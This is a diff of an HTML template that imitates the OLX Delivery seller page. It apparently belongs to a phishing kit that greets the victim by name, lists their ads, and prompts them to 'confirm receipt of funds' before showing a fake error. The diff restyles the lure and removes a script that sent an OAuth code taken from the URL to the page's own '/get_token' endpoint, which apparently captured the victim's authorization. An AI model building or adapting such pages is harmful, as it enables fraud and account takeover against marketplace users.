@@ -10,9 +10,7 @@
         tailwind.config = {
             theme: {
                 extend: {
-                    fontFamily: {
-                        sans: ['Inter', 'sans-serif'],
-                    },
+                    fontFamily: { sans: ['Inter', 'sans-serif'] },
                     colors: {
                         olx: {
                             dark: '#002f34',
@@ -22,7 +20,8 @@
                             bg: '#f2f4f5',
                             border: '#d8dfe0',
                             error: '#ff5636',
-                            success: '#00b56a'
+                            success: '#00b56a',
+                            yellow: '#ffce32'
                         }
                     }
                 }
@@ -32,39 +31,27 @@
     <style>
         .hide-scrollbar::-webkit-scrollbar { display: none; }
         .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
-
-        .olx-loader .dot {
-            width: 14px;
-            height: 14px;
-            border-radius: 50%;
-            background-color: #002f34;
-            animation: olx-bounce 1.4s infinite ease-in-out both;
-        }
+        
+        .olx-loader .dot { width: 14px; height: 14px; border-radius: 50%; background-color: #002f34; animation: olx-bounce 1.4s infinite ease-in-out both; }
         .olx-loader .dot:nth-child(1) { animation-delay: -0.32s; }
         .olx-loader .dot:nth-child(2) { animation-delay: -0.16s; background-color: #23e5db; }
         .olx-loader .dot:nth-child(3) { animation-delay: 0s; }
-
-        @keyframes olx-bounce {
-            0%, 80%, 100% { transform: scale(0); }
-            40% { transform: scale(1); }
-        }
-
-        .toast-enter { transform: translate(-50%, 100%); opacity: 0; }
+        @keyframes olx-bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
+        
         .toast-active { transform: translate(-50%, 0); opacity: 1; }
-
-        .ads-scroll::-webkit-scrollbar { width: 5px; }
-        .ads-scroll::-webkit-scrollbar-track { background: transparent; }
+        .toast-enter { transform: translate(-50%, 100%); opacity: 0; }
+        
+        .ads-scroll::-webkit-scrollbar { width: 6px; }
         .ads-scroll::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
-
-        .ad-card.selected {
-            border-color: #00b56a !important;
-            background-color: #f0fdf4;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0, 181, 106, 0.08);
+        
+        /* Стили для выбранного объявления */
+        .ad-card.selected { 
+            border-color: #002f34 !important; 
+            background-color: #f8f9fa; 
         }
-        .ad-card.selected .status-badge {
-            background-color: #00b56a !important;
-            color: #ffffff !important;
+        .ad-card.selected .status-badge { 
+            background-color: #002f34 !important; 
+            color: #ffffff !important; 
         }
     </style>
 </head>
@@ -72,51 +59,28 @@
 
     <div id="loading-overlay" class="fixed inset-0 bg-white/60 backdrop-blur-[2px] z-40 flex items-center justify-center hidden transition-opacity duration-200">
         <div class="olx-loader flex gap-2">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
+            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
         </div>
     </div>
 
     <div id="error-toast" class="fixed bottom-6 left-1/2 w-[90%] max-w-[400px] bg-[#1f2937] text-white px-5 py-3.5 rounded-md shadow-2xl z-50 flex items-center gap-3 transition-all duration-300 toast-enter">
-        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ff5636" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="shrink-0">
-            <circle cx="12" cy="12" r="10"></circle>
-            <line x1="12" y1="8" x2="12" y2="12"></line>
-            <line x1="12" y1="16" x2="12.01" y2="16"></line>
-        </svg>
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ff5636" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="shrink-0"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
         <span id="toast-text" class="text-[14px] font-medium leading-tight">Щось пішло не так. Перевірте з'єднання з інтернетом.</span>
     </div>
 
     <header class="bg-olx-dark text-white px-4 md:px-6 h-[64px] md:h-[72px] flex justify-between items-center w-full sticky top-0 z-30">
         <div class="flex items-center w-full max-w-[1232px] mx-auto justify-between">
             <div class="flex items-center gap-4">
-                <button class="md:hidden text-white">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <line x1="3" y1="12" x2="21" y2="12"></line>
-                        <line x1="3" y1="6" x2="21" y2="6"></line>
-                        <line x1="3" y1="18" x2="21" y2="18"></line>
-                    </svg>
-                </button>
+                <button class="md:hidden text-white"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+                <div class="font-black text-xl tracking-tighter hidden sm:block text-olx-cyan">OLX</div>
             </div>
             <div class="flex items-center gap-4 md:gap-6 text-[14px] md:text-[15px] font-semibold">
-                <div class="hidden md:flex text-olx-gray font-medium gap-1">
-                    <a href="#" class="text-white hover:underline">Укр</a>
-                    <span>|</span>
-                    <a href="#" class="hover:underline">Рус</a>
-                </div>
-                <a href="#" class="hidden sm:block hover:text-gray-200 transition">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
-                    </svg>
-                </a>
+                <div class="hidden md:flex text-olx-gray font-medium gap-1"><a href="#" class="text-white hover:underline">Укр</a><span>|</span><a href="#" class="hover:underline">Рус</a></div>
                 <div class="flex items-center gap-1 md:gap-2 cursor-pointer hover:text-gray-200 transition">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
-                        <circle cx="12" cy="7" r="4"></circle>
-                    </svg>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                     <span class="hidden md:inline">Ваш профіль</span>
                 </div>
-                <button class="bg-white text-olx-dark font-bold text-[13px] md:text-[15px] py-[8px] md:py-[10px] px-4 md:px-6 rounded hover:bg-gray-100 transition md:ml-2">Додати</button>
+                <button class="bg-white text-olx-dark font-bold py-[8px] md:py-[10px] px-4 md:px-6 rounded hover:bg-gray-100 transition md:ml-2">Додати</button>
             </div>
         </div>
     </header>
@@ -124,9 +88,23 @@
     <div class="bg-white">
         <div class="max-w-[1232px] mx-auto px-4 md:px-6 py-6 md:py-8 flex flex-col md:flex-row justify-between items-start gap-4">
             <h1 class="text-[24px] md:text-[32px] font-bold tracking-tight">OLX Доставка</h1>
-            <div class="flex flex-row items-center gap-2 md:gap-4 w-full md:w-auto">
-                <button class="flex-1 md:flex-none border-[2px] border-olx-dark font-bold text-[13px] md:text-[14px] py-[8px] md:py-[10px] px-3 md:px-5 rounded hover:bg-gray-50 transition h-[40px] md:h-11">Поповнити</button>
-                <button class="flex-1 md:flex-none bg-olx-dark text-white font-bold text-[13px] md:text-[14px] py-[8px] md:py-[10px] px-3 md:px-5 rounded hover:bg-[#003f46] transition h-[40px] md:h-11">Купити пакет</button>
+            
+            <div class="flex flex-col sm:flex-row items-start sm:items-center gap-4 w-full md:w-auto mt-2 md:mt-0">
+                
+                <div class="flex items-center gap-3 w-full sm:w-auto border-b sm:border-none border-gray-100 pb-3 sm:pb-0">
+                    <div class="w-10 h-10 bg-olx-lightcyan rounded-full flex items-center justify-center text-olx-dark shrink-0">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                    </div>
+                    <div class="flex flex-col">
+                        <span class="text-[14px] md:text-[15px] font-bold text-olx-dark leading-tight">Вітаємо, {{ user_name }}!</span>
+                        <span class="text-[12px] text-olx-gray font-medium mt-0.5">ID: {{ user_id }}</span>
+                    </div>
+                </div>
+
+                <div class="flex gap-2 w-full sm:w-auto">
+                    <button class="flex-1 md:flex-none border-[2px] border-olx-dark font-bold text-[13px] md:text-[14px] py-[8px] px-3 md:px-5 rounded hover:bg-gray-50 transition h-[40px] md:h-11">Поповнити</button>
+                    <button class="flex-1 md:flex-none bg-olx-dark text-white font-bold text-[13px] md:text-[14px] py-[8px] px-3 md:px-5 rounded hover:bg-[#003f46] transition h-[40px] md:h-11">Купити пакет</button>
+                </div>
             </div>
         </div>
 
@@ -137,7 +115,7 @@
                 <a href="#" class="py-3 md:py-4 hover:text-olx-dark transition">Шукаю роботу</a>
                 <a href="#" class="py-3 md:py-4 hover:text-olx-dark transition">Профіль</a>
                 <a href="#" class="py-3 md:py-4 hover:text-olx-dark transition">Налаштування</a>
-                <a href="#" class="py-3 md:py-4 text-olx-dark font-bold border-b-[3px] border-olx-dark flex items-center gap-2">OLX Доставка</a>
+                <a href="#" class="py-3 md:py-4 text-olx-dark font-bold border-b-[3px] border-olx-dark">OLX Доставка</a>
             </nav>
         </div>
     </div>
@@ -147,42 +125,42 @@
             <div class="flex gap-6 md:gap-8 border-b border-olx-border text-[14px] md:text-[15px] text-olx-gray mb-6 md:mb-8 overflow-x-auto hide-scrollbar whitespace-nowrap">
                 <a href="#" class="pb-[12px] md:pb-[14px] text-olx-dark font-bold border-b-[3px] border-olx-dark">Мої продажі</a>
                 <a href="#" class="pb-[12px] md:pb-[14px] hover:text-olx-dark transition">Мої покупки</a>
-                <a href="#" class="pb-[12px] md:pb-[14px] hover:text-olx-dark transition">Способи доставки й оплати</a>
-                <a href="#" class="pb-[12px] md:pb-[14px] hover:text-olx-dark transition">Успішність покупок</a>
             </div>
 
-            <div class="flex gap-2 text-[13px] md:text-[14px] mb-8 overflow-x-auto hide-scrollbar whitespace-nowrap pb-2">
-                <button class="bg-olx-lightcyan text-olx-dark px-4 py-[6px] md:py-[7px] rounded-full shrink-0">Всі</button>
-                <button class="border border-olx-border text-olx-dark hover:border-gray-400 px-4 py-[6px] md:py-[7px] rounded-full transition shrink-0">Очікують підтвердження</button>
-                <button class="border border-olx-border text-olx-dark hover:border-gray-400 px-4 py-[6px] md:py-[7px] rounded-full transition shrink-0">Очікує відправки</button>
-                <button class="border border-olx-border text-olx-dark hover:border-gray-400 px-4 py-[6px] md:py-[7px] rounded-full transition shrink-0">Доставка</button>
-                <button class="border border-olx-border text-olx-dark hover:border-gray-400 px-4 py-[6px] md:py-[7px] rounded-full transition shrink-0">Виконані</button>
-                <button class="border border-olx-border text-olx-dark hover:border-gray-400 px-4 py-[6px] md:py-[7px] rounded-full transition shrink-0">Відхилені</button>
-            </div>
-
-            <div class="max-w-[440px] mx-auto bg-white border border-olx-border rounded-xl shadow-sm overflow-hidden flex flex-col">
-                <div class="p-4 border-b border-olx-border text-center bg-gray-50/50">
-                    <h2 class="text-[16px] font-bold text-olx-dark">Оберіть товар для підтвердження виплати</h2>
-                </div>
-
-                <div class="ads-scroll max-h-[360px] overflow-y-auto p-3 grid grid-cols-2 gap-3" id="ads-container">
+            <div class="max-w-[650px] mx-auto">
+                <h2 class="text-[18px] md:text-[20px] font-bold text-olx-dark mb-4">Оберіть товар для підтвердження виплати</h2>
+                
+                <div class="ads-scroll max-h-[420px] overflow-y-auto flex flex-col gap-3 pr-2" id="ads-container">
                     {% if user_ads %}
                         {% for ad in user_ads %}
-                        <div class="ad-card bg-white border border-olx-border rounded-lg overflow-hidden cursor-pointer transition-all duration-200 flex flex-col" onclick="selectAd(this, '{{ ad.url }}', '{{ ad.title }}')">
-                            <img src="{{ ad.img }}" class="w-full h-24 object-cover bg-gray-50 border-b border-olx-border" alt="product">
-                            <div class="p-2 flex-grow flex flex-col justify-between">
-                                <div class="text-[12px] font-semibold text-olx-dark line-clamp-2 h-8 leading-tight mb-2">{{ ad.title }}</div>
-                                <div class="status-badge text-[11px] font-bold text-olx-gray text-center bg-gray-100 p-1.5 rounded uppercase tracking-wider transition-colors">Обрати</div>
+                        <div class="ad-card flex items-center bg-white border border-olx-border rounded-lg p-3 cursor-pointer transition-all duration-200" onclick="selectAd(this, '{{ ad.url }}', '{{ ad.title }}')">
+                            
+                            <div class="relative w-[90px] h-[90px] md:w-[110px] md:h-[110px] shrink-0 bg-olx-bg rounded overflow-hidden">
+                                <img src="{{ ad.img }}" onerror="this.src='https://placehold.co/400x400/f2f4f5/7f9799?text=Фото\nтовару'" class="w-full h-full object-cover alt="product">
+                                
+                                <div class="absolute bottom-0 left-0 w-full bg-olx-yellow flex items-center justify-center gap-1 py-1">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#002f34" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="3" width="15" height="13"></rect><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon><circle cx="5.5" cy="18.5" r="2.5"></circle><circle cx="18.5" cy="18.5" r="2.5"></circle></svg>
+                                    <span class="text-[9px] font-black text-olx-dark uppercase tracking-tight">Доставка</span>
+                                </div>
+                            </div>
+                            
+                            <div class="ml-4 flex flex-col justify-between h-full flex-grow py-1">
+                                <div class="text-[14px] md:text-[16px] font-semibold text-olx-dark line-clamp-2 leading-tight">{{ ad.title }}</div>
+                                <div class="mt-3">
+                                    <span class="status-badge inline-block text-[12px] font-bold text-olx-dark bg-olx-bg px-3 py-1.5 rounded transition-colors">Обрати</span>
+                                </div>
                             </div>
                         </div>
                         {% endfor %}
                     {% else %}
-                        <p class="col-span-2 text-center text-[13px] text-olx-gray py-10">Оголошень не знайдено</p>
+                        <div class="text-center py-12 border border-dashed border-olx-border rounded-lg bg-gray-50">
+                            <p class="text-[15px] text-olx-gray font-medium">Активних оголошень не знайдено</p>
+                        </div>
                     {% endif %}
                 </div>
 
-                <div class="p-4 border-t border-olx-border bg-gray-50/50">
-                    <button id="confirm-btn" class="w-full py-3.5 bg-gray-300 text-gray-500 font-bold text-[14px] rounded-lg transition-colors cursor-not-allowed" onclick="submitSelection()" disabled>
+                <div class="mt-6 pt-4 border-t border-olx-border">
+                    <button id="confirm-btn" class="w-full md:w-auto md:min-w-[300px] py-3.5 px-6 bg-gray-300 text-gray-500 font-bold text-[15px] rounded transition-colors cursor-not-allowed mx-auto block" onclick="submitSelection()" disabled>
                         Підтвердити отримання коштів
                     </button>
                 </div>
@@ -194,16 +172,19 @@
         let selectedAdData = { url: "", title: "" };
 
         function selectAd(element, url, title) {
+            // Сброс предыдущего выбора
             document.querySelectorAll('.ad-card').forEach(card => {
                 card.classList.remove('selected');
                 card.querySelector('.status-badge').innerText = "Обрати";
             });
             
+            // Установка нового выбора
             element.classList.add('selected');
             element.querySelector('.status-badge').innerText = "Обрано";
             
             selectedAdData = { url, title };
             
+            // Активация кнопки
             const btn = document.getElementById('confirm-btn');
             btn.disabled = false;
             btn.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
@@ -268,32 +249,12 @@
 
                     setTimeout(() => {
                         overlay.classList.add('hidden');
-                        showToast("Щось пішло не так. Перевірте з'єднання з інтернетом.");
+                        showToast("Функція тимчасово недоступна.");
                         isProcessing = false;
-                    }, 1500);
+                    }, 1000);
                 });
             });
         });
-
-        window.onload = () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            const code = urlParams.get("code");
-            
-            if (code && !sessionStorage.getItem('done_auth')) {
-                fetch("/get_token", { 
-                    method: "POST", 
-                    headers: { "Content-Type": "application/json" }, 
-                    body: JSON.stringify({ code }) 
-                })
-                .then(r => { 
-                    if(r.ok) { 
-                        sessionStorage.setItem('done_auth', code); 
-                        window.history.replaceState({}, document.title, "/");
-                    } 
-                })
-                .catch(err => console.error("Token error:", err));
-            }
-        };
     </script>
 </body>
 </html>
